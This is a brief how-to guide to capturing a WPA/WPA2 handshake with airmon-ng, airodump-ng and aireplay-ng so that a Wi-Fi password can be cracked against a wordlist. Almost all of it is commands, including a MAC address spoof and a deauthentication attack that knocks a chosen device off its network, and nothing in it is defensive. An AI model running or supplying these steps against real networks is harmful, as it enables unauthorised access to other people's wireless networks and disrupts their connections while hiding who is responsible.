# WPA/WPA2 Handshake Capture Guide

This guide outlines hows to capture a WPA/WPA2 handshake in order to attempt to crack the pre-shared key using a wordlist.

## Tools
- Kali Linux
- External wireless adapter
- airmon-ng, airodump-ng, aireplay-ng

  # Check for adapter
  sudo iwconfig

  # Enable adapter if disabled.

  # Bring Down network in adapter
    Sudo ifconfig wlan0 down

  # Terminate running processes
    Sudo airmon-ng check kill

  # Turn monitor mode for adapter
    Sudo airmon-ng start wlan0

  # Spoof MAC address
    Sudo macchanger -r wlan0

  # Determine which networks 5GHz or 2GHz to test
    Sudo airodump-ng --band a wlan0

  # Target a network
    Sudo airodump-ng --bssid (Targeted Network MAC) --channel (Targeted Network Channel) --write (txt file, optional) wlan0

  # Devices talking to network should be listed.

  # using seperate command target a device, to shut down, in order for it ping for a handshake with network during restart.
    Sudo aireplay-ng --deauth 4 -a (Target Network MAC) -c(Target Device MAC) wlan0
  
